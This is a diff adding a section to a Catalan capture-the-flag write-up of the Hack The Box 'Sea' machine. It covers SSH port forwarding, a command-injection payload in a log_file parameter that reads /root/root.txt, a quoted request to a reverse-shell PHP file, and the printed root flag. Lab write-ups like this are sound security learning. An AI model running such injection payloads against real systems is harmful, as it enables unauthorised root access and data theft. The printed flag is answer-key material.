@@ -619,4 +619,99 @@ Sorry, try again.
 Sorry, user amay may not run sudo on sea. 
 ```
 
+Després d'estar estona cercant, he vist que altra gent ha utilitzat la tècnica de port forwarding, auqí hi ha info sobre què és: https://builtin.com/software-engineering-perspectives/ssh-port-forwarding?source=post_page-----55c0b226020e--------------------------------
+
+Ho utilitzarem, i ara el que haurem de fer és, a la nostra màquina, la atacant, revisar que per exemple no estiguem utilitzant el port 8080:
+
+``sudo lsof -i 8080``
+
+I un cop revisat, llencem la comanda següent i posem la contrasenya de l'usuari amay: 
+
+```
+──(polkali㉿kaliPol)-[~]
+└─$ sudo ssh -L 8080:localhost:8080 amay@sea.htb
+The authenticity of host 'sea.htb (10.10.11.28)' can't be established.
+ED25519 key fingerprint is SHA256:xC5wFVdcixOCmr5pOw8Tm4AajGSMT3j5Q4wL6/ZQg7A.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:16: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yyes
+Please type 'yes', 'no' or the fingerprint: yes
+Warning: Permanently added 'sea.htb' (ED25519) to the list of known hosts.
+amay@sea.htb's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)`
+```
+
+Ara, anem al navegador i anem a`` localhost:8080`` ens sortirà una finestra demanant les credencials i posem les credencials de l'usuari amay. Ara veiem el següent:
+
+![[Pasted image 20240824122107.png]]
+
+I si ens hi fixem a baix de tot a Analyze Log File veiem que hi ha acces.log i auth.log, utilitzarem Burpsuite per clicar a Analyze i veure si podem interceptar i aconseguir alguna cosa valuosa. He utilitzat el navegador propi de Burpsuite ja que amb el meu no m'ha funcionat i així no perdia el temps mirant quina configuració fallava:
+
+![[Pasted image 20240824122215.png]]
+
+Ara, enviem al Repeater de Burpsuite les intercepcions que hem fet, i així podrem analitzar bé el que enviem als servidors i les seves respostes:
+
+Després d'analitzar la resposta del servidor dels log que analitzem, ens trobem que a sota de tot hi ha el següent a l'access.log:
+
+````
+<p class='error'>Suspicious traffic patterns detected in /var/log/apache2/access.log:</p><pre>10.10.16.7 - - [24/Aug/2024:10:28:37 +0000] "GET /themes/revshell-main/rev.php?lhost=10.10.16.7 HTTP/1.1" 404 3666 "-" "curl/7.81.0"</pre>
+````
+
+![[Pasted image 20240824123700.png]]
+
+A diferència de l'auth.log on hi ha el següent:
+
+![[Pasted image 20240824123801.png]]
+
+Sembla que amb el que hem vist a l'access.log podríem enviar comandes al servidor. Provarem de modificar el log.file al Repeater per enviar alguna comanda a veure si tenim èxit. Funciona:
+
+![[Pasted image 20240824123946.png]]
+
+Per tant, ara li demano al ChatGPT que em generi un payload per obtenir la root flag, i ens fa el següent payload:
+``log_file=/root/root.txt;cat%20/root/root.txt%3E/tmp/root_flag.txt&analyze_log=``
+
+### Explicació del payload:
+
+- **log_file=/root/root.txt**: Canvia el fitxer de registre que s'analitza per `/root/root.txt`.
+- **cat%20/root/root.txt%3E/tmp/root_flag.txt**: Això llegeix el contingut del fitxer `root.txt` i el redirigeix cap a un fitxer nou, `/tmp/root_flag.txt`, que potser podràs llegir amb permisos d'usuari normal.
+- **%20**: Representa un espai.
+- **%3E**: Representa el caràcter `>` que és utilitzat per redirigir la sortida d'un comando a un fitxer.
+
+I així és com obtenim la root flag:
+
+```
+           </form>
+            98ad116949266fe68da77aa104ceb3d5
+<p class='error'>Suspicious traffic patterns detected in /root/root.txt;cat /root/root.txt>/tmp/root_flag.txt:</p><pre>98ad116949266fe68da77aa104ceb3d5</pre>`
+```
+
+![[Pasted image 20240824130352.png]]
+
+Com que el payload genera un fitxer al directori /tmp, també podem veure la root flag allà:
+
+```
+amay@sea:/tmp$ ls -la
+total 60
+drwxrwxrwt 14 root root 4096 Aug 24 11:04 .
+drwxr-xr-x 19 root root 4096 Feb 21  2024 ..
+drwxrwxrwt  2 root root 4096 Aug 24 09:03 .font-unix
+drwxrwxrwt  2 root root 4096 Aug 24 09:03 .ICE-unix
+-rw-r--r--  1 root root   33 Aug 24 11:01 root_flag.txt
+drwx------  2 root root 4096 Aug 24 09:03 snap-private-tmp
+drwx------  3 root root 4096 Aug 24 09:03 systemd-private-bd97976328444518ad3ff60a76410e29-apache2.service-pnpGyf
+drwx------  3 root root 4096 Aug 24 09:03 systemd-private-bd97976328444518ad3ff60a76410e29-ModemManager.service-sd16Ag
+drwx------  3 root root 4096 Aug 24 09:03 systemd-private-bd97976328444518ad3ff60a76410e29-systemd-logind.service-hTZTei
+drwx------  3 root root 4096 Aug 24 09:03 systemd-private-bd97976328444518ad3ff60a76410e29-systemd-resolved.service-wpD20e
+drwx------  3 root root 4096 Aug 24 09:03 systemd-private-bd97976328444518ad3ff60a76410e29-systemd-timesyncd.service-Qz1Sqj
+drwxrwxrwt  2 root root 4096 Aug 24 09:03 .Test-unix
+drwx------  2 root root 4096 Aug 24 09:03 vmware-root_806-2999526336
+drwxrwxrwt  2 root root 4096 Aug 24 09:03 .X11-unix
+drwxrwxrwt  2 root root 4096 Aug 24 09:03 .XIM-unix
+amay@sea:/tmp$ cat root_flag.txt 
+98ad116949266fe68da77aa104ceb3d5
+```
+
+Entreguem la root flag i ja tenim la màquina feta:
+
+![[Pasted image 20240824130750.png]]
 
